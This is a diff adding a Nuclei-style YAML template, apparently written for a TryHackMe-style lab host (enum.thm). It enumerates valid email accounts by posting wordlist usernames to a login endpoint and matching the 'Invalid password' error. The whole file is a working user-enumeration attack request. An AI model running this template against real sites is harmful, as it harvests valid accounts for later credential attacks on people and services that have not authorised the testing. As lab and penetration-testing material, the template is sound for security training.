@@ -1,0 +1,40 @@
+id: email-enumeration
+
+info:
+  name: Email Enumeration
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    This template performs email enumeration by identifying valid emails based on server responses. It checks for the error message indicating invalid passwords.
+  tags: email,enumeration
+
+variables:
+  invalid_password_error: "Invalid password"
+  password: "password"
+  function: "login"
+
+http:
+  - raw:
+      - |
+        POST /labs/verbose_login/functions.php HTTP/1.1
+        Host: enum.thm
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Origin: http://enum.thm
+        Connection: keep-alive
+        Referer: http://example.com/labs/verbose_login/
+        Cookie: PHPSESSID=2dpt1pp6m274fajm5t49kkg1i7
+        Priority: u=0
+
+        username={{username}}&password={{password}}&function={{function}}
+    payloads:
+      username: wordlists/emails.txt
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - "{{invalid_password_error}}"
